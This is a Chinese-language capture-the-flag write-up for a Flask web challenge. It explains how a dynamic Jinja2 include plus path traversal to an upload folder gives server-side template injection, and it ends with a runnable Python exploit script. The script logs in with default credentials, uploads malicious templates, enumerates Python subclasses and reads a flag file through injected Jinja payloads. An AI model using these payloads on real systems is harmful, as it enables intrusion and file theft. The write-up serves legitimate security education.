## 1、题目描述

这是一个包含源码的 Web CTF 题目（靶机： http://ip32856 ）。题目提示："Do you know that is not a rare practice to dynamically include JINJA templates?"。源码为一个 Flask 应用，模板目录部署在 `static` 下，页面 `error.html` 使用 `{% include error_type %}` 动态包含模板。

## 2、知识点

- Jinja2 模板注入（SSTI）：当模板内容可被用户控制或包含不可信文件时，攻击者可注入 Jinja 表达式实现信息泄露或远程命令执行。
- 了解 Flask 模板查找路径与 `render_template`、`render_template_string` 的工作原理。
- 利用文件上传（或可写目录）把恶意 Jinja 模板写入可被 include 的路径，或通过路径跳转（../）将 include 指向已写入的位置。

## 3、题目解题方法思路

1. 分析源码发现 `app/website/app/routes.py` 中的 `/error` 路由：
   - 它把 `error_type = 'templates/' + request.args.get('error_type')`，然后把拼接路径解析为绝对路径并保证位于 `safe_dir = '/var/www/.../app/static/'` 下。
   - 最后把相对路径（相对于 `safe_dir`）传入 `render_template('templates/error.html', ..., error_type=...)`，在 `error.html` 中使用 `{% include error_type %}` 动态包含文件 → 导致 SSTI（如果包含的文件包含 Jinja 表达式）。
2. 在源码中存在可上传文件的接口 `/update_profile`，文件会被保存到 `.../app/static/images/` 下。
3. 关键点：虽然 `error` 路由在参数前加了 `templates/` 前缀，但是路径解析时允许使用 `../`，从而可以将包含目标从 `static/templates/...` 跳回到 `static/images/...`，从而包含我们上传到 `static/images/` 的恶意模板。

因此流程为：登录（默认用户 test/test 存在），上传一个包含 Jinja payload 的 `.html` 文件到 `static/images/`，然后访问 `/error?error_type=../../images/<payload.html>` 来触发包含并执行模板表达式，读取 flag 文件。

## 4、解题步骤

1. 登录：POST /login username=test password=test。
2. 上传恶意模板：POST /update_profile，multipart 表单字段包含必需的个人信息字段，并上传 `image_profile` 文件（例如文件名 `pwn.html`），文件内容为 Jinja 表达式用于读取 flag。
3. 触发包含：访问 `/error?error_type=../../images/pwn.html`，页面会把 `static/images/pwn.html` 的内容通过 Jinja include 渲染，从而执行其中的 Jinja 表达式并把结果输出到页面上。

（提示）常见 flag 路径有 `/flag`、`/home/ctf/flag`、`/root/flag` 等。若一次未成功，可尝试不同的 Jinja payload 或枚举可用的子类索引以调用 `os.popen` / `subprocess`。

## 5、exp

下面给出一份可直接运行的 Python 利用脚本 `exp.py`（使用 requests）：

```python
#!/usr/bin/env python3
import sys
import re
import time
import requests

TARGET =  'http://ip32856'
s = requests.Session()

def login():
    url = TARGET.rstrip('/') + '/login'
    r = s.post(url, data={'username':'test','password':'test'}, allow_redirects=True, timeout=10)
    return r.status_code

def upload(name, content):
    url = TARGET.rstrip('/') + '/update_profile'
    data = {'name':'a','lastname':'b','email':'c','loan_amount':'1','loan_term_months':'1','monthly_payment':'1'}
    files = {'image_profile':(name, content.encode('utf-8'), 'text/html')}
    r = s.post(url, data=data, files=files, timeout=10)
    return r.status_code

def trigger(filename):
    url = TARGET.rstrip('/') + '/error'
    r = s.get(url, params={'error_type':'../images/' + filename}, timeout=15)
    return r

def enum_subclasses(limit=300):
    payload = (
        "{% for i in range(0," + str(limit) + ") %}"
        "{% set c = ''.__class__.__mro__[1].__subclasses__()[i] %}"
        "{% if c.__name__ %}{{ i }}: {{ c.__name__ }}\n"
        "{% else %}{{ i }}: {{ c }}\n{% endif %}{% endfor %}"
    )
    upload('enum.html', payload)
    time.sleep(0.8)
    r = trigger('enum.html')
    return r.text if r is not None else ''

def find_indices_with_open():
    # Try chunked checks to avoid large templates causing 500 errors
    out = []
    ranges = list(range(0, 400, 50))
    for start in ranges:
        end = start + 50
        # build a small template that only checks this window
        check_payload = (
            "{% for i in range(" + str(start) + "," + str(end) + ") %}"
            "{% set c = ''.__class__.__mro__[1].__subclasses__()[i] %}"
            "{% if c.__init__ and 'open' in c.__init__.__globals__ %}{{ i }}\n{% endif %}"
            "{% endfor %}"
        )
        upload('check_open.html', check_payload)
        time.sleep(0.6)
        r = trigger('check_open.html')
        if r is None:
            continue
        for line in r.text.splitlines():
            m = re.match(r"^(\d+)$", line.strip())
            if m:
                idx = int(m.group(1))
                if idx not in out:
                    out.append(idx)
    return out

def try_read_flag(indices):
    for idx in indices:
        print('[*] Trying index', idx)
        payload = "{{ ''.__class__.__mro__[1].__subclasses__()[%d].__init__.__globals__['open']('/flag').read() }}" % idx
        upload('read.html', payload)
        time.sleep(0.6)
        r = trigger('read.html')
        if r is None:
            print('[!] No response for idx', idx)
            continue
        text = r.text
        m = re.search(r'FLAG\{[0-9a-fA-F]{40,}\}|flag\{.*?\}|CTF\{.*?\}', text)
        if m:
            return m.group(0), text
        else:
            # print small diagnostic
            snippet = '\n'.join(text.splitlines()[:40])
            print('[i] idx', idx, 'no flag; response snippet:')
            print(snippet)
    return None, None

def main():
    print('[*] Target:', TARGET)
    print('[*] Logging in')
    code = login()
    if code not in (200,302):
        print('[!] login failed', code)
        return
    # Quick test: try known working index first (fast path)
    known = [107]
    print('[*] Trying known indices first:', known)
    flag, _ = try_read_flag(known)
    if flag:
        print('\n=== FLAG FOUND ===')
        print(flag)
        return

    print('[*] Enumerating subclasses in chunks... (this may take a short while)')
    # small enum to show progress
    enum = enum_subclasses(80)
    print('[i] enum snippet:')
    print('\n'.join(enum.splitlines()[:30]))
    print('[*] Finding indices exposing open() via __init__.__globals__...')
    indices = find_indices_with_open()
    print('[*] Candidate indices:', indices)
    if not indices:
        print('[!] No candidate indices found; consider increasing range and re-running')
        return
    flag, full = try_read_flag(indices)
    if flag:
        print('\n=== FLAG FOUND ===')
        print(flag)
        return
    print('[!] Exploit finished; flag not found with candidate indices')

if __name__ == '__main__':
    main()

```



